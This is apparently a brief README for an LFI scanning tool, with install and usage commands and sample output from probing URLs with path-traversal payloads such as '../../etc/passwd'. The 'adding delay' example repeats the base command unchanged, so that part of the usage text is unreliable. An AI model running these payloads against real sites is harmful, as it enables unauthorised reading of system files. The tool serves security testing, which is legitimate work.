# LFI_TOOL

pip install requests

cat lifurl.txt | python lfi_check.py -p payloads.txt


for adding delay

cat lifurl.txt | python lfi_check.py -p payloads.txt 

OUTPUT
=====
Checking URL: http://example.com/vulnerable_script.php?file=
Testing: http://example.com/vulnerable_script.php?file=../../../../../../../../etc/passwd
Testing: http://example.com/vulnerable_script.php?file=../../etc/passwd
Testing: http://example.com/vulnerable_script.php?file=/etc/passwd
LFI Vulnerability found with payload: ../../etc/passwd

Checking URL: http://testsite.com/include.php?path=
Testing: http://testsite.com/include.php?path=../../../../../../../../etc/passwd
Testing: http://testsite.com/include.php?path=../../etc/passwd
Testing: http://testsite.com/include.php?path=/etc/passwd
Received status code: 404
Received status code: 404
Received status code: 404
LFI vulnerability not found
